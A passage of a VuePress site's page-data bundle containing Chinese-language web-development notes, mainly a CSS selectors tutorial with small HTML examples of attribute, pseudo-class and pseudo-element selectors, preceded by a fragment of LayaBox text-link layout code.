arr.length; i ) {\n                            let firstx = (i == 0) ? 0 : arr[i - 1] 1;// 每行最开始字符的索引\n                            let firstliney = words[firstx].y words[firstx].height;\n                            graphic.drawline(words[firstx].x,firstliney,words[arr[i]].x words[arr[i]].width,firstliney,color,1);\n                        }\n                    }else{\n                        graphic.drawline(words[0].x,liney,lastwords.x lastwords.width,liney,color,1);\n                    }\n                }\n                const hitarr = [];\n                var hitrec=htmlhitrect.create();\n                if (words[0].y != words[words.length - 1].y) {\n                    for (let i = 0; i < arr.length; i ) {\n                        let firstx = (i == 0) ? 0 : arr[i - 1] 1;// 每行最开始字符的索引\n                        const hitrecnew = htmlhitrect.create();\n                        hitrecnew.rec.setto(words[firstx].x,words[firstx].y,words[arr[i]].x words[arr[i]].width-words[firstx].x,words[firstx].height);\n                        hitrecnew.href=this.href;// 每段点击区域都要加这个，否则event.link解析不出参数\n                        hitarr.push(hitrecnew);\n                    }\n                } else {\n                    hitrec.rec.setto(words[0].x,lastwords.y,lastwords.x lastwords.width-words[0].x,lastwords.height);\n                }\n                hitrec.href=this.href;\n                reclist.push(hitrec);\n                for (let i = 0; i < hitarr.length; i ) {\n                    reclist.push(hitarr[i]);\n                }\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n',charsets:{cjk:!0}},{frontmatter:{},regularPath:"/book-web/",relativePath:"book-web/README.md",key:"v-36341369",path:"/book-web/",headers:[{level:2,title:"说明",slug:"说明",normalizedTitle:"说明",charIndex:12}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"说明",content:"# web部分\n\n\n# 说明\n\n * 有一些常用工具的使用，比如Npm、Git、VSCode、Docsify、Gitbook、Chrome\n * 有数据结构与算法的ts版本\n * 有H5游戏引擎的学习，比如LayaBox、CocosCreator\n * 剩余一些前端散记，比如学习JavaScript、基于mocha+chai的单元测试\n * 具体可以打开左侧侧边栏查看！",normalizedContent:"# web部分\n\n\n# 说明\n\n * 有一些常用工具的使用，比如npm、git、vscode、docsify、gitbook、chrome\n * 有数据结构与算法的ts版本\n * 有h5游戏引擎的学习，比如layabox、cocoscreator\n * 剩余一些前端散记，比如学习javascript、基于mocha+chai的单元测试\n * 具体可以打开左侧侧边栏查看！",charsets:{cjk:!0}},{title:"1.选择器",frontmatter:{title:"1.选择器"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/1.%E9%80%89%E6%8B%A9%E5%99%A8.html",relativePath:"book-web/html、css、js、ts/学习CSS/1.选择器.md",key:"v-94436878",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/1.%E9%80%89%E6%8B%A9%E5%99%A8.html",headers:[{level:2,title:"一、选择器是什么",slug:"一、选择器是什么",normalizedTitle:"一、选择器是什么",charIndex:10},{level:2,title:"二、属性选择器",slug:"二、属性选择器",normalizedTitle:"二、属性选择器",charIndex:282},{level:3,title:"2.1 一般的属性选择器",slug:"_2-1-一般的属性选择器",normalizedTitle:"2.1 一般的属性选择器",charIndex:294},{level:3,title:"2.2 搭配通配符使用",slug:"_2-2-搭配通配符使用",normalizedTitle:"2.2 搭配通配符使用",charIndex:724},{level:3,title:"2.3 大小写敏感",slug:"_2-3-大小写敏感",normalizedTitle:"2.3 大小写敏感",charIndex:2347},{level:2,title:"三、伪类选择器",slug:"三、伪类选择器",normalizedTitle:"三、伪类选择器",charIndex:2772},{level:3,title:"3.1 常见的结构性伪类",slug:"_3-1-常见的结构性伪类",normalizedTitle:"3.1 常见的结构性伪类",charIndex:2878},{level:3,title:"3.2 处理子元素",slug:"_3-2-处理子元素",normalizedTitle:"3.2 处理子元素",charIndex:4624},{level:3,title:"3.3 状态伪类选择器",slug:"_3-3-状态伪类选择器",normalizedTitle:"3.3 状态伪类选择器",charIndex:9965},{level:2,title:"四、伪元素选择器",slug:"四、伪元素选择器",normalizedTitle:"四、伪元素选择器",charIndex:13767},{level:3,title:"first-line、first-letter",slug:"first-line、first-letter",normalizedTitle:"first-line、first-letter",charIndex:13951},{level:3,title:"before、after",slug:"before、after",normalizedTitle:"before、after",charIndex:14481},{level:3,title:"selection",slug:"selection",normalizedTitle:"selection",charIndex:16688},{level:2,title:"五、关系选择器",slug:"五、关系选择器",normalizedTitle:"五、关系选择器",charIndex:17085},{level:3,title:"5. 后代选择器",slug:"_5-后代选择器",normalizedTitle:"5. 后代选择器",charIndex:17097},{level:3,title:"5.2 子代关系选择器",slug:"_5-2-子代关系选择器",normalizedTitle:"5.2 子代关系选择器",charIndex:17374},{level:3,title:"5.3 邻接兄弟选择器",slug:"_5-3-邻接兄弟选择器",normalizedTitle:"5.3 邻接兄弟选择器",charIndex:17861},{level:3,title:"5.4 通用兄弟选择器",slug:"_5-4-通用兄弟选择器",normalizedTitle:"5.4 通用兄弟选择器",charIndex:18163},{level:2,title:"六、层叠与继承",slug:"六、层叠与继承",normalizedTitle:"六、层叠与继承",charIndex:18550},{level:3,title:"6.1 层叠和继承的简述",slug:"_6-1-层叠和继承的简述",normalizedTitle:"6.1 层叠和继承的简述",charIndex:18562},{level:3,title:"6.2 继续了解css继承",slug:"_6-2-继续了解css继承",normalizedTitle:"6.2 继续了解css继承",charIndex:19298},{level:3,title:"6.3 继续了解层叠",slug:"_6-3-继续了解层叠",normalizedTitle:"6.3 继续了解层叠",charIndex:20824}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、选择器是什么 二、属性选择器 2.1 一般的属性选择器 2.2 搭配通配符使用 2.3 大小写敏感 三、伪类选择器 3.1 常见的结构性伪类 3.2 处理子元素 3.3 状态伪类选择器 四、伪元素选择器 first-line、first-letter before、after selection 五、关系选择器 5. 后代选择器 5.2 子代关系选择器 5.3 邻接兄弟选择器 5.4 通用兄弟选择器 六、层叠与继承 6.1 层叠和继承的简述 6.2 继续了解css继承 6.3 继续了解层叠",content:'# 选择器\n\n\n# 一、选择器是什么\n\n选择器一览表\n\n选择器用来指定页面上我们想要样式化的html元素，是css中获取html元素的一种手段。在简介了就提过css的基本语法选择器 {样式属性: 值}，就是告诉浏览器你的这个页面的那个元素要设置什么样式，所以选择器的学习很重要。\n\n前面使用过简单的选择器，其实选择器完整的形式是这样的：E[foo=val]，E是标签，foo通常是属性，val是属性值。例如：div[id="div_Big"]是选择了页面中id为"div_Big"的div元素。如果选择器写错了（语法错误），那么选择器的这条样式是失效的。\n\n\n# 二、属性选择器\n\n\n# 2.1 一般的属性选择器\n\n可以给html元素添加属性，比如id和class等一些自定义属性（别忘了id的优先级更高哦），然后就可以通过属性选择器对元素进行样式添加。属性选择器的写法就是[att=val]，其中att是属性，val是属性值。对了，别搞混css样式属性和html元素属性，根本就不是一个的东西。\n\n<html>\n<head>\n    <style type="text/css">\n        /* id属性（html元素属性），section是值， background-color是css样式属性，yellow是值 */\n        [id=section] { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <div id="section">示例文本</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 2.2 搭配通配符使用\n\n在使用选择器的使用可以加上~、|、*、^、?、$等通配\n\n[att~=val]：如果att属性的值就是val或者空格隔开的val，那么就选择这个属性所在的元素。例如：选择器是[id~=section]，那么id为"section"、"section search"的元素都会被选中。\n\n[att|=val]：如果att属性的值就是val或者以val开头再接一个连字符，那么就选择这个属性所在的元素。例如：选择器是[id|=zh]，那么id为"zh"、"zh-xxx"的元素都会被选中。\n\n[att*=val]：如果att属性的值中包含val，那么就选择这个属性所在的元素。例如：选择器是[id*=section]，那么id为"0section123"、"1section-456"的元素都会被选中。\n\n[att^=val]：如果att属性的值开头是val，那么就选择这个属性所在的元素。例如：选择器是[id^=section]，那么id为"section12"、"section-46"的元素都会被选中。\n\n[att$=val]：如果att属性的值结尾是val，那么就选择这个属性所在的元素。例如：选择器是[id$=section]，那么id为"12section"、"div_section"的元素都会被选中。如果是-1结尾的记得要在选择器中转义，[id$=\\-1]。\n\n<html>\n<head>\n    <style type="text/css">\n        li[class] { font-size: 200%; }\n        li[class="a"] { background-color: yellow; }\n        li[class~="a"] { color: red; }\n        li[class|="zh"] { color: green; }\n    </style>\n</head>\n<body>\n    <ul>\n        <li>Item 1</li>\x3c!--没有样式--\x3e\n        <li class="a">Item 2</li>\x3c!--黄底红字--\x3e\n        <li class="a b">Item 3</li>\x3c!--红字--\x3e\n        <li class="zh">Item 4</li>\x3c!--绿字--\x3e\n        <li class="zh-b">Item 5</li>\x3c!--绿字--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n下面的例子是给以/结尾和以html结尾的a标签的末尾添加红色文字，给以jpg结尾的添加绿色文字\n\n<html>\n<head>\n    <style type="text/css">\n        a[href$=\\/]:after, a[href$=html]:after { content: "web网页"; color: red; }\n        a[href$=jpg]:after { content: "JPEG图像文件"; color: green; }\n    </style>\n</head>\n<body>\n    <a href="http://css3/">示例文本</a>\x3c!--后面添加了红色文字--\x3e\n    <a href="http://css3/css3.html">示例文本</a>\x3c!--后面添加了红色文字--\x3e\n    <a href="photo.jpg">示例文本</a>\x3c!--后面添加了绿色文字--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 2.3 大小写敏感\n\n如果想在大小写不敏感的情况下匹配属性值的话，你可以在[]里面的末尾加上i。\n\n<html>\n<head>\n    <style type="text/css">\n        li[class^="a"] { background-color: yellow; }\n        li[class^="a" i] { color: red; }\n    </style>\n</head>\n<body>\n    <ul>\n        <li class="a">Item 1</li>\x3c!--黄底红字--\x3e\n        <li class="A">Item 2</li>\x3c!--仅红字--\x3e\n        <li class="Ab">Item 3</li>\x3c!--仅红字--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 三、伪类选择器\n\n伪类选择器是用来选择处于特定状态或特定结构下的元素，特定状态或结构的名字在css中已经定义好了。实际上是对页面上现存的元素进行操作，行为比较像类选择器。伪类是以冒号为开头的，:xxx。\n\n\n# 3.1 常见的结构性伪类\n\n有4个常见的结构性伪类选择器：root、not、empty和target。\n\n# root\n\nroot选取页面的根元素，根元素是指位于页面最顶层结构的元素，一般是整个页面的<html>部分。\n\n<html>\n<head>\n    <style type="text/css">\n        :root { background-color: yellow; } /* 整个页面底色是黄色 */\n        body { background-color: limegreen; } /* 而body是绿色 */\n    </style>\n</head>\n<body>\n    <h2>选择器是什么</h2>\n    <p>选择器是css中获取页面元素的一种手段，可以将样式与元素直接绑定起来，还可以实现各种复杂的指定，能精简样式表的代码量...</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# not\n\nnot是为了排除元素的某些子元素。\n\n<html>\n<head>\n    <style type="text/css">\n        body *:not(h2){ background-color: yellow; } /* body都是黄色但除了h2元素 */\n    </style>\n</head>\n<body>\n    <h2>选择器是什么</h2>\n    <p>选择器是css中获取页面元素的一种手段，可以将样式与元素直接绑定起来，还可以实现各种复杂的指定，能精简样式表的代码量...</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# empty\n\nempty是选取元素中内容为空白的区域或者没有子元素的元素。\n\n<html>\n<head>\n    <style type="text/css">\n        :empty { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <table border="1" cellpadding="0" cellspacing="0">\n        <tr><td>A</td><td>B</td><td>C</td></tr>\n        <tr><td>D</td><td>E</td><td></td></tr>\x3c!--最后一项没有内容，并且背景是黄色的--\x3e\n    </table>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# target\n\ntarget是选取页面中URL目标元素，点击超链接会跳转到target元素，然后:target就会起作用。类似于文章中的标题跳转到对应内容。\n\n<html>\n<head>\n    <style type="text/css">\n        :target { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <p id="menu">\n        <a href="#text1">示例文字1</a> |\x3c!--点击超链接就会跳转到对应id的元素上--\x3e\n        <a href="#text2">示例文字2</a> |\n        <a href="#text3">示例文字3</a> |\n    </p>\n    <div id="text1"><h2>示例文字1</h2><p>...此处略去</p></div>\x3c!--跳转到这里后变为黄色--\x3e\n    <div id="text2"><h2>示例文字2</h2><p>...此处略去</p></div>\n    <div id="text3"><h2>示例文字3</h2><p>...此处略去</p></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 3.2 处理子元素\n\n可以对一个父元素中的第一个、最后一个、指定序号、第偶数个、第奇数个子元素进行样式的指定，通用写法子元素名称:xxx-child。\n\n# first-child、last-child\n\nfirst-child对父元素的第一个子元素进行指定样式（其实一般要配合使用才算是第一个子元素，例如ul li:first-child）。\n\nlast-child对父元素的最后一个子元素进行指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        /*.ul1元素的直接子元素，并且是第一个元素也是Li元素*/\n        .ul1 > li:first-child { background-color: yellow; }\n        /*父元素中的最后一个元素并且是Li元素*/\n        li:last-child { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色，“>”配合first-child可以只改变第一层的第一个li--\x3e\n        <li>项目列表2\n            <ul>\n                <li>项目列表2-1</li>\x3c!--没有改变--\x3e\n                <li>项目列表2-2</li>\n                <li>项目列表2-3</li>\n                <li>项目列表2-4</li>\x3c!--浅蓝色--\x3e\n            </ul>\n        </li>\n        <li>项目列表3</li>\n        <li>项目列表4</li>\x3c!--浅蓝色，不加“>”限制的话就是所有的最后一项li--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# nth-child、nth-last-child\n\nnth-child对父元素的第几个子元素进行指定样式。\n\nnth-last-child对父元素的倒数第几个子元素进行指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        .ul1 > li:nth-child(1) { background-color: yellow; }\n        li:nth-last-child(2) { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色，“>”配合nth-child可以只改变第一层的第一个li--\x3e\n        <li>项目列表2\n            <ul>\n                <li>项目列表2-1</li>\x3c!--没有改变--\x3e\n                <li>项目列表2-2</li>\n                <li>项目列表2-3</li>\x3c!--浅蓝色--\x3e\n                <li>项目列表2-4</li>\n            </ul>\n        </li>\n        <li>项目列表3</li>\x3c!--浅蓝色，不加“>”限制的话就是所有的倒数第二项li--\x3e\n        <li>项目列表4</li>\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nnth-child和nth-last-child还可以对父元素中第奇数个或偶数个子元素使用样式。\n\n<html>\n<head>\n    <style type="text/css">\n        .ul1 > li:nth-child(odd) { background-color: yellow; }\n        li:nth-child(even) { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色，“>”配合first-child可以只改变第一层的奇数项li--\x3e\n        <li>项目列表2       \x3c!--浅蓝色--\x3e\n            <ul>\n                <li>项目列表2-1</li>\x3c!--浅蓝色，因为父元素是浅蓝色--\x3e\n                <li>项目列表2-2</li>\x3c!--浅蓝色--\x3e\n                <li>项目列表2-3</li>\x3c!--浅蓝色--\x3e\n                <li>项目列表2-4</li>\x3c!--浅蓝色--\x3e\n            </ul>\n        </li>\n        <li>项目列表3</li>\x3c!--黄色，“>”配合first-child可以只改变第一层的奇数项li--\x3e\n        <li>项目列表4</li>\x3c!--浅蓝色，不加“>”限制的话就是所有的最后一项li--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nnth-child和nth-last-child的使用其实还有个问题，比如p:nth-child(odd)，它的意思是父元素的奇数项并且是p元素，而不是父元素的第奇数个p元素，因为父元素的子元素可能是多种类型的元素，这两种选择器就是第几项并且是xxx元素，这一点一定要分清楚的。\n\n<html>\n<head>\n    <style type="text/css">\n        h2:nth-child(odd) { background-color: yellow; }/*解释起来就是父元素中的奇数项并且是h2元素*/\n        h2:nth-child(even) { background-color: skyblue; }/*解释起来就是父元素中的偶数项并且是h2元素*/\n    </style>\n</head>\n<body>\n    <h2>文章标题1</h2>\x3c!--黄色，父元素奇数项并且是h2元素--\x3e\n    <p>文章正文1</p>\x3c!--无颜色，父元素偶数项但是是p元素--\x3e\n    <h2>文章标题2</h2>\x3c!--黄色，父元素奇数项并且是h2元素--\x3e\n    <p>文章正文2</p>\x3c!--无颜色，父元素偶数项但是是p元素--\x3e\n    <h2>文章标题3</h2>\x3c!--黄色，父元素奇数项并且是h2元素--\x3e\n    <p>文章正文3</p>\x3c!--无颜色，父元素偶数项但是是p元素--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# nth-of-type、nth-last-of-type\n\n因为nth-child和nth-last-child的问题，我们可以选择nth-of-type和nth-last-of-type。\n\nnth-of-type对父元素里同类型子元素的第几项进行指定样式。\n\nnth-last-of-type对父元素里同类型子元素的倒数第几项进行指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        h2:nth-of-type(odd) { background-color: yellow; }\n        h2:nth-of-type(even) { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <h2>文章标题1</h2>\x3c!--黄色，父元素里的h2元素奇数项--\x3e\n    <p>文章正文1</p>\n    <h2>文章标题2</h2>\x3c!--浅蓝色，父元素里的h2元偶数项--\x3e\n    <p>文章正文2</p>\n    <h2>文章标题3</h2>\x3c!--黄色，父元素里的h2元素奇数项--\x3e\n    <p>文章正文3</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# nth-child的循环使用\n\n**nth-child(an+b)**可以对父元素里的子元素进行样式的循环使用，特别适合父元素里元素繁多的场景；a表示每次循环中共包括几种样式，b表示指定的样式在循环中所处的位置。\n\n<html>\n<head>\n    <style type="text/css">\n        li:nth-child(4n+1) { background-color: yellow; }\n        li:nth-child(4n+2) { background-color: limegreen; }\n        li:nth-child(4n+3) { background-color: red; }\n        li:nth-child(4n+4) { background-color: white; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色--\x3e\n        <li>项目列表2       \x3c!--绿色--\x3e\n            <ul>\n                <li>项目列表2-1</li>\x3c!--黄色--\x3e\n                <li>项目列表2-2</li>\x3c!--绿色--\x3e\n                <li>项目列表2-3</li>\x3c!--红色--\x3e\n                <li>项目列表2-4</li>\x3c!--白色--\x3e\n            </ul>\n        </li>\n        <li>项目列表3</li>\x3c!--红色--\x3e\n        <li>项目列表4</li>\x3c!--白色--\x3e\n        <li>项目列表5</li>\x3c!--黄色--\x3e\n        <li>项目列表6</li>\x3c!--绿色--\x3e\n        <li>项目列表7</li>\x3c!--红色--\x3e\n        <li>项目列表8</li>\x3c!--白色--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# only-child\n\n对父元素里只有一个元素时使用的样式，可以采用子元素:nth-child(1):nth-last-child(1)，也可以使用子元素:only-child\n\n<html>\n<head>\n    <style type="text/css">\n        li:only-child { background-color: yellow; }\n        /*li:nth-child(1):nth-last-child(1) { background-color: yellow; }*/\n    </style>\n</head>\n<body>\n    <h2>ul列表A</h2>\n    <ul>\n        <li>列表项目A1</li>\x3c!--黄色--\x3e\n    </ul>\n    <h2>ul列表B</h2>\n    <ul>\n        <li>列表项目B1</li>\x3c!--无色--\x3e\n        <li>列表项目B2</li>\x3c!--无色--\x3e\n        <li>列表项目B3</li>\x3c!--无色--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 3.3 状态伪类选择器\n\n状态伪类选择器是对UI元素某种状态下的一种伪类选择器，在默认状态下是不起作用的。\n\n# hover、active、focus\n\nhover为鼠标指针悬浮“头顶”的元素指定样式。\n\nactive为处于激活状态（例如鼠标按下）的元素指定样式。\n\nfocus为已获取焦点的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:hover { background-color: blue; }\n        input[type="text"]:focus { background-color: red; }\n        input[type="text"]:active { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <form>\n    <p>姓名：<input type="text" name="name" /></p>\x3c!--鼠标悬浮时蓝色，获得焦点时红色，按住时黄色--\x3e\n    <p>地址：<input type="text" name="address" /></p>\x3c!--鼠标悬浮时蓝色，获得焦点时红色，按住时黄色--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# enabled、disabled\n\nenabled为处于可用状态下的元素指定样式。\n\ndisabled为处于禁用状态下的元素指定样式。\n\n<html>\n<head>\n    <script>\n    const change = () => {\n        const radio = document.getElementById("radio1");\n        const text = document.getElementById("text");\n        text.disabled = radio.checked ? "" : "disabled";\n    };\n    <\/script>\n    <style type="text/css">\n        input[type="text"]:enabled { background-color: yellow; }\n        input[type="text"]:disabled { background-color: red; }\n    </style>\n</head>\n<body>\n    <form>\n        <input type="radio" id="radio1" name="radio" onchange="change()"/>可用<br/>\n        <input type="radio" id="radio2" name="radio" onchange="change()" checked />不可用<br/>\n        <input type="text" id="text" disabled />\x3c!--禁用时是红色的，可用时是黄色的--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# read-only、read-write\n\nread-only为处于只读状态下的元素指定样式。\n\nread-write为处于可读及可写状态下的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:read-only { background-color: gray; }\n        input[type="text"]:read-write { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <form>\n        <p>姓名：<input type="text" name="name" /></p>\x3c!--可读及可写是黄色的--\x3e\n        <p>地址：<input type="text" name="address" value="上海" readonly="readonly"/></p>\x3c!--只读是灰色的--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# indeterminate\n\nindeterminate为打开页面时单选框或多选框中**没有一个选项被选中（未定状态）**时指定整个元素的样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="radio"]:indeterminate { outline:3px solid red; }\n    </style>\n</head>\n<body>\n    <form>\n        性别：<br/>\n        <input type="radio" name="radio" value="male" />男\x3c!--进入页面没有一项是被选中的，那么都为红色边框--\x3e\n        <input type="radio" name="radio" value="femal" />女\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# invalid、valid\n\nE:valid为处于处于合法状态下的元素指定样式。\n\nE:invalid为处于处于非法状态下的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:valid { background:white; }\n        input[type="text"]:invalid { background:red; }\n    </style>\n</head>\n<body>\n    <p>请输入任意文字：<input type="text" required /></p>\x3c!--输入文字时白色，没有输入时红色--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# required、optional\n\nrequired为已设置了必填属性的元素指定样式。\n\noptional为没有设置必填的元素（选填）指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:required { border-color: red; border-width:3px; }\n        input[type="text"]:optional { border-color: black; border-width:1px; }\n    </style>\n</head>\n<body>\n    <form>\n        <p>姓名：<input type="text" required placeholder="必须输入姓名" /></p>\x3c!--必填项为红色框--\x3e\n        <p>地址：<input type="text" /></p>\x3c!--选填项为黑色框--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# in-range、out-of-range\n\nin-range为处于有效值的元素指定样式。\n\nout-of-range为处于失效值的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="number"]:in-range { background-color: white; }\n        input[type="number"]:out-of-range { background-color: red; border-width:1px; }\n    </style>\n</head>\n<body>\n    <form>\n        输入1到100之间的数值：<input type="number" min=0 max=100 />\x3c!--数值超过范围就会显示红色--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 四、伪元素选择器\n\n伪元素选择器针对的是元素中的一部分来定义样式，而不是真实元素本身整个整体，因为那一部分并不能用html标签表示；和伪类选择器一样是css中已经定义好的选择器，不能随便取名。使用方法就是元素::伪元素 {样式属性:值}或者元素.类名::伪元素 {样式属性:值}，其实早期是使用单冒号的，现在你可能会看到一部分伪元素是使用单冒号（向前兼容）。\n\n\n# first-line、first-letter\n\nfirst-line用于向某个元素中的第一行文字使用样式。\n\nfirst-letter用于向某个元素中文字的首字母或第一个字使用的样式。\n\n<html>\n<head>\n    <style type="text/css">\n        p#text1::first-line { color: #0000FF }\n        p#text2::first-letter { color: #0000FF }\n        p#text3::first-letter { color: #0000FF }\n    </style>\n</head>\n<body>\n    <p id="text1">段落中的第一行。<br>段落中的第二行。</p>\x3c!--段落中第一行为蓝色--\x3e\n    <p id="text2">This is an english text.</p>\x3c!--首字母为蓝色--\x3e\n    <p id="text3">这是一段中文文字。</p>\x3c!--第一个字为蓝色--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# before、after\n\nbefore用于在某个元素之前插入一些内容。用法就是元素::before { content: 插入内容 }。\n\nafter用于在某个元素之后插入一些内容。用法就是元素::after { content: 插入内容 }。\n\n<html>\n<head>\n    <style type="text/css">\n        li::before { content: "###"; }\n        li::after { content: "(仅用于测试，请勿用于商业用途。)"; font-size: 12px; color: red; }\n    </style>\n</head>\n<body>\n    <ul>\n        <li><a href="movie1.mp4">狄仁杰之通天帝国</a></li>\x3c!--前面会带上"###"，后面会带上红色文字--\x3e\n        <li><a href="movie2.mp4">精武风云</a></li>\x3c!--前面会带上"###"，后面会带上红色文字--\x3e\n        <li><a href="movie3.mp4">大笑江湖</a></li>\x3c!--前面会带上"###"，后面会带上红色文字--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n这两种选择器的content为none的话就代表不插入内容，有些情况下normal也是同样的效果。这个功能就能控制哪些使用追加哪些不使用，比如提示博客哪些是上新的在头部或尾部加个小提示。\n\n而且content还能插入图片例如url(mark.png)，它比background-image:url(mark.png)这种方式追加多一个好处就是，它可以使用打印机打印出来。\n\ncontent使用counter可以作为编号追加到元素上，常和css的counter-increment搭配使用。甚至使用counter的第二个参数给编号指定类型，例如counter(section, upper-alpha)，这是使用了大写字母编号，upper-roman是大写罗马字母等等。\n\n<html>\n<head>\n    <style type="text/css">\n        body { counter-reset:section; }  /*设置或重置section*/\n        h1 { counter-reset:subsection; } /*设置或重置subsection*/\n        h1::before {\n            counter-increment:section;              /*增量计数section*/\n            content:"第" counter(section) "章 ";    /*使用section*/\n            /*其他样式*/\n        }\n        h2::before {\n            counter-increment:subsection;                           /*增量计数subsection*/\n            content:counter(section) "." counter(subsection) " ";   /*使用section和subsection*/\n            /*其他样式*/\n        }\n    </style>\n</head>\n<body>\n    <h1>HTML tutorials</h1>\n    <h2>HTML Tutorial</h2>\n    <h2>XHTML Tutorial</h2>\n    <h2>CSS Tutorial</h2>\n\n    <h1>Scripting tutorials</h1>\n    <h2>JavaScript</h2>\n    <h2>VBScript</h2>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\ncontent除了使用counter，还可以使用open-quote和close-quote来给元素的首尾添加引号、括号等嵌套文字字符\n\n<html>\n<head>\n    <style type="text/css">\n        h1 { quotes: "(" ")" "[" "]"; } /* 前两个值规定第一级引用嵌套，后两个值规定下一级引号嵌套。 */\n        h1::before { content: open-quote; }\n        h1::after { content: close-quote; }\n    </style>\n</head>\n<body>\n    <h1>标题</h1>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# selection\n\nselection用处于被选中的那部分进行指定样式。\n\n<html>\n<head>\n    <style 